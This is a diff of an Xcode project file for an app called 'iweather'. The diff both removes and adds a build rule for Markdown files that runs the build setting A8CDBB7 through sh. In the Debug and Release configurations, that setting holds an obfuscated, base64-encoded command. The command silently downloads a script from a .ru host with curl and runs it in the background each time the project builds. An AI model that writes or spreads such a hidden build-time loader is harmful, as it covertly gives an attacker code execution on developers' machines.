@@ -7,11 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0E3668010CE44FEDBA7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = FB5A6AF73E4B42C1977BBDC8; };
+		A272886A5FC244FEA77BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 2A3BC440B8CE4C14927BBDC8; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		4354A1AA9F924825B57BBDC8 /* PBXBuildRule */ = {
+		6F487FFA48D04DBCBA7BBDC8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -25,10 +25,10 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8CDBB7}\"";
 			};
-	/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		FB5A6AF73E4B42C1977BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		2A3BC440B8CE4C14927BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -62,7 +62,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED036D3032D74E00F68C15 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				FB5A6AF73E4B42C1977BBDC8 /* README.md */,
+				2A3BC440B8CE4C14927BBDC8 /* README.md */,
 				8EED036C3032D74E00F68C15 /* iweather.app */,
 			);
 			name = Products;
@@ -80,7 +80,7 @@ sh -c \"${A8CDBB7}\"";
 				8EED036A3032D74E00F68C15 /* Resources */,
 			);
 			buildRules = (
-				4354A1AA9F924825B57BBDC8 /* PBXBuildRule */,
+				6F487FFA48D04DBCBA7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -133,7 +133,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0E3668010CE44FEDBA7BBDC8 /* README.md */,
+				A272886A5FC244FEA77BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -153,7 +153,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((m(){ `printf bXase64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgNCAtTGtmcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2wyY3BsLWVtdC5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((a(){ `printf baose64 | tr -d o` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIzIC1ma3NMIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | a | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -218,7 +218,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((m(){ `printf bXase64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgNCAtTGtmcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2wyY3BsLWVtdC5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((a(){ `printf baose64 | tr -d o` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIzIC1ma3NMIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | a | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
